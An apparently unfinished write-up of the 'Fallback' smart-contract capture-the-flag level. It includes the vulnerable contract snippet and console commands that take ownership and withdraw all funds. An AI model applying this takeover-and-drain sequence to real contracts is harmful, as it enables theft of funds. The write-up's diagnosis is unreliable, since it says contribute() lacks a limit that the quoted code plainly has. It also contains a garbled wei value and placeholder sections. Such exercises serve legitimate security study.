# Challenge Title: Fallback
## Author

- [@SW02d](https://github.com/SWO2D)
## Goal(s)
You will beat this level if:

* You claim ownership of the contract
* You reduce its balance to 0

## Contract

`Fallback.sol`

## Issue(s)

* unauthorized takeover:

 the "contribute" function does not have a maximum amount that can be contributed


```
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
## Attack scenario(s)

* Attacker could become the owner of this contract by contributing more than the original owner and surpassing their total contributions. The attacker could also use the "receive" function to send a transaction with a value greater than 0 in order to become the owner of the contract. then the attacker can call the "withdraw" function to withdraw all of the funds from the contract.

## Attack contract

[to add]

## Recommendation

We recommend to make sure that the code is secure by enforcing access controls correctly and implementing a maximum amount for the "contribute" function.

### Code fix

[to add]

## Solving the challenge
- Player address now has 0 contributions. so we can send a smaller amount than 0.001 to become a contributor.

```
await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})
```

- Now we can send any small amount we want for example 0.0000.1 wei:

```
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})
```

- Congrats you're now the owner of the contract.
```
await contract.owner()
// Output: [ADDRESS]
```
- You can withdraw contract's funds:

```
await contract.withdraw()
```
